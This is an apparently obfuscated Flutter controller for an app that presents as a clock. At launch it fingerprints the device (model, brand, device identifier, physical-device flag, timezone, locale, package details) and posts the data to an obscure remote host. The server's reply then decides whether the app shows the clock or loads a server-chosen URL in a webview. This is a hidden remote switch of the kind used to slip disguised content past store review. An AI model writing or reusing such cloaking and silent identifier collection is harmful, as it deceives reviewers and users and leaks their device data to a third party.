import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var hdiuxm = RxBool(false);
  var iawtzpgujd = RxBool(true);
  var whayuvo = RxString("");
  var esta = RxBool(false);
  var lubowitz = RxBool(true);
  final zhfwvgc = Dio();


  InAppWebViewController? webViewController;

  void engine(){
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitDown,
      DeviceOrientation.portraitUp
    ]);
  }

  void checkNet() async {
    var connectResult = await (Connectivity().checkConnectivity());
    if(connectResult == ConnectivityResult.none){
      engine();
      Get.toNamed("/net_error");
    }
  }

  @override
  void onInit() {
    checkNet();
    super.onInit();
    xfbm();
  }


  Future<void> xfbm() async {

    esta.value = true;
    lubowitz.value = true;
    iawtzpgujd.value = false;

    zhfwvgc.post("https://mo.lnurap.xyz/dgehcwxotuqnyzlsivmpfj",data: await gahxkcdq()).then((value) {
      var juway = value.data["juway"] as String;
      var htmujc = value.data["htmujc"] as bool;
      if (htmujc) {
        whayuvo.value = juway;
        engine();
        georgiana();
      } else {
        rippin();
      }
    }).catchError((e) {
      iawtzpgujd.value = true;
      lubowitz.value = true;
      esta.value = false;
    });
  }

  Future<Map<String, dynamic>> gahxkcdq() async {
    final DeviceInfoPlugin mnjw = DeviceInfoPlugin();
    PackageInfo pidn_wjeml = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cgfrbjw = Platform.localeName;
    var ketlus_IvUcx = currentTimeZone;

    var ketlus_rhbzDZ = pidn_wjeml.packageName;
    var ketlus_veJ = pidn_wjeml.version;
    var ketlus_IDLsqjp = pidn_wjeml.buildNumber;

    var ketlus_CoMema = pidn_wjeml.appName;
    var ketlus_oL  = "";
    var delbertRogahn = "";
    var ketlus_zIk = "";
    var hoytHodkiewicz = "";
    var brendaMayer = "";
    var marleyBergnaum = "";


    var diegoHickle = "";
    var ketlus_mpnU = "";
    var ketlus_PKzogXu = "";
    var ketlus_mAtsrqTO = false;

    if (GetPlatform.isAndroid) {
      ketlus_PKzogXu = "android";
      var fyndpjis = await mnjw.androidInfo;

      ketlus_zIk = fyndpjis.brand;

      ketlus_mpnU  = fyndpjis.model;
      ketlus_oL = fyndpjis.id;

      ketlus_mAtsrqTO = fyndpjis.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ketlus_PKzogXu = "ios";
      var bxwzcndp = await mnjw.iosInfo;
      ketlus_zIk = bxwzcndp.name;
      ketlus_mpnU = bxwzcndp.model;

      ketlus_oL = bxwzcndp.identifierForVendor ?? "";
      ketlus_mAtsrqTO  = bxwzcndp.isPhysicalDevice;
    }
    var res = {
      "ketlus_CoMema": ketlus_CoMema,
      "ketlus_IDLsqjp": ketlus_IDLsqjp,
      "ketlus_rhbzDZ": ketlus_rhbzDZ,
      "delbertRogahn" : delbertRogahn,
      "ketlus_mpnU": ketlus_mpnU,
      "ketlus_IvUcx": ketlus_IvUcx,
      "brendaMayer" : brendaMayer,
      "ketlus_zIk": ketlus_zIk,
      "ketlus_oL": ketlus_oL,
      "cgfrbjw": cgfrbjw,
      "ketlus_mAtsrqTO": ketlus_mAtsrqTO,
      "hoytHodkiewicz" : hoytHodkiewicz,
      "ketlus_veJ": ketlus_veJ,
      "marleyBergnaum" : marleyBergnaum,
      "diegoHickle" : diegoHickle,
      "ketlus_PKzogXu": ketlus_PKzogXu,

    };
    return res;
  }

  Future<void> rippin() async {
    Get.offAllNamed("/clockMain");
  }

  Future<void> georgiana() async {
    Get.offAllNamed("/clockMarry");
  }

}
